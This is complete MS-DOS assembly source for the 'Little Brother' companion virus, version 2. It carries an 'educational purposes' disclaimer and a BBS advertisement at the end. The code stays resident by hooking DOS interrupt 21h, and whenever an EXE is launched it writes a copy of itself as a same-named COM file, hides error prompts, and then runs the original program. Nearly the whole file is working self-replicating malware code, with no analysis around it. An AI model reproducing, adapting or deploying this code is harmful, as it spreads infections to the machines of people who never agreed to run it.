;****************************************************************************
;*  Little Brother    version 2
;*
;*  Compile with MASM 4.0
;*  (other assemblers will probably not produce the same result)
;*
;*  Disclaimer:
;*  This file is only for educational purposes. The author takes no
;*  responsibility for anything anyone does with this file. Do not
;*  modify this file!
;****************************************************************************

cseg            segment
                assume  cs:cseg,ds:cseg,es:nothing

                .RADIX  16

FILELEN         equ     end - begin
RESPAR          equ     (FILELEN/16d) + 17d
VERSION         equ     2
oi21            equ     end
nameptr         equ     end+4
DTA             equ     end+8


;****************************************************************************
;*              Install the program!
;****************************************************************************

                org     100h

begin:          cld

                mov     ax,0044h                ;move program to empty hole
                mov     es,ax
                mov     di,0100h
                mov     si,di
                mov     cx,FILELEN
        rep     movsb

                mov     ds,cx                   ;get original int21 vector
                mov     si,0084h
                mov     di,offset oi21
                mov     dx,offset ni21
                lodsw
                cmp     ax,dx                   ;already installed?
                je      cancel
                stosw
                movsw

                push    es                      ;set vector to new handler
                pop     ds
                mov     ax,2521h
                int     21h

cancel:         ret


;****************************************************************************
;*              File-extensions
;****************************************************************************

EXE_txt         db      'EXE',0
COM_txt         db      'COM',0


;****************************************************************************
;*              Interupt handler 24
;****************************************************************************

ni24:           mov     al,03
                iret


;****************************************************************************
;*              Interupt handler 21
;****************************************************************************

ni21:           pushf
                push    dx
                push    bx
                push    ax
                push    ds
                push    es

                cmp     ax,4B00h                ;execute ?
                jne     exit

doit:           call    infect

exit:           pop     es
                pop     ds
                pop     ax
                pop     bx
                pop     dx
                popf

                jmp     dword ptr cs:[oi21]     ;call to old int-handler


;****************************************************************************
;*              Tries to infect the file (ptr to ASCIIZ-name is DS:DX)
;****************************************************************************

infect:         cld

                mov     word ptr cs:[nameptr],dx  ;save the ptr to the filename
                mov     word ptr cs:[nameptr+2],ds

                mov     ah,2Fh                  ;get old DTA
                int     21
                push    es
                push    bx

                push    cs                      ;set new DTA
                pop     ds
                mov     dx,offset DTA
                mov     ah,1Ah
                int     21

                call    searchpoint
                push    di
                mov     si,offset COM_txt       ;is extension 'COM'?
                mov     cx,3
        rep     cmpsb
                pop     di
                jz      do_com

                mov     si,offset EXE_txt       ;is extension 'EXE'?
                mov     cl,3
        rep     cmpsb
                jnz     return

do_exe:         mov     si,offset COM_txt       ;change extension to COM
                call    change_ext

                mov     ax,3300h                ;get ctrl-break flag
                int     21
                push    dx

                cwd                             ;clear the flag
                inc     ax
                push    ax
                int     21

                mov     ax,3524h                ;get int24 vector
                int     21
                push    bx
                push    es

                push    cs                      ;set int24 vec to new handler
                pop     ds
                mov     dx,offset ni24
                mov     ah,25h
                push    ax
                int     21

                lds     dx,dword ptr [nameptr]  ;create the virus (unique name)
                xor     cx,cx
                mov     ah,5Bh
                int     21
                jc      return1                 
                xchg    bx,ax                   ;save handle

                push    cs
                pop     ds
                mov     cx,FILELEN              ;write the virus
                mov     dx,offset begin
                mov     ah,40h
                int     21
                cmp     ax,cx
                pushf

                mov     ah,3Eh                  ;close the file
                int     21

                popf
                jz      return1                 ;all bytes written?

                lds     dx,dword ptr [nameptr]  ;no, delete the virus
                mov     ah,41h
                int     21

return1:        pop     ax                      ;restore int24 vector
                pop     ds
                pop     dx
                int     21

                pop     ax                      ;restore ctrl-break flag
                pop     dx
                int     21

                mov     si,offset EXE_txt       ;change extension to EXE
                call    change_ext              ;execute EXE-file

return:         mov     ah,1Ah                  ;restore old DTA
                pop     dx
                pop     ds
                int     21

                ret

do_com:         call    findfirst               ;is the COM-file a virus?
                cmp     word ptr cs:[DTA+1Ah],FILELEN
                jne     return                  ;no, execute COM-file
                mov     si,offset EXE_txt       ;does the EXE-variant exist?
                call    change_ext
                call    findfirst
                jnc     return                  ;yes, execute EXE-file
                mov     si,offset COM_txt       ;change extension to COM
                call    change_ext
                jmp     short return            ;execute COM-file


;****************************************************************************
;*              Find the file
;****************************************************************************

findfirst:      lds     dx,dword ptr [nameptr]
                mov     cl,27h
                mov     ah,4Eh
                int     21
                ret                


;****************************************************************************
;*              change the extension of the filename (CS:SI -> ext)
;****************************************************************************

change_ext:     call    searchpoint
                push    cs
                pop     ds
                movsw
                movsw
                ret


;****************************************************************************
;*              search begin of extension  
;****************************************************************************

searchpoint:    les     di,dword ptr cs:[nameptr]
                mov     ch,0FFh
                mov     al,0
        repnz   scasb
                sub     di,4
                ret


;****************************************************************************
;*              Text and Signature
;****************************************************************************

                db      'Little Brother',0

end:

cseg            ends
                end     begin

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

